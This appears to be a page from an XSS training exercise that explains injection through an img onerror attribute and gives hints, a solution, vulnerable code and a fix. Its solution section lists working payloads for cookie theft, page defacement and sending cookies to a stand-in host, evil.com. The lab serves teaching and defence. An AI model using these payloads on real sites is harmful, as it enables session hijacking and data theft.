onerror in <img> Injection

The onerror event in an <img> tag executes JavaScript when the image fails to load. Injecting user-controlled code into this attribute creates an XSS vulnerability.

HOW img onerror INJECTION WORKS:
• <img src="invalid.jpg" onerror="alert('XSS')">
• When the image fails to load, the onerror event executes the JavaScript
• Attackers can inject malicious code that runs automatically without user interaction!
• NEVER let users control the onerror attribute!
Hints
  • Click "alert XSS" - alert pops immediately when image fails
  • Click "change background" - page background changes instantly
  • The onerror event fires automatically when the image fails to load

Solution

Working Payloads (inject into img onerror):

  • alert('XSS') - Alert when image fails
  • alert(document.cookie) - Steal cookies
  • document.body.innerHTML = '<h1>Hacked</h1>' - Deface page
  • this.src = 'https://evil.com/steal?c='+document.cookie - Exfiltrate data

Classic XSS Payload:

<img src=x onerror=alert('XSS')>

Vulnerable Code:

let userCode = document.getElementById('input').value;
let img = document.getElementById('targetImage');
img.setAttribute('onerror', userCode);  // DANGEROUS!

Fix: Never let users control event handlers. Use addEventListener with safe functions.
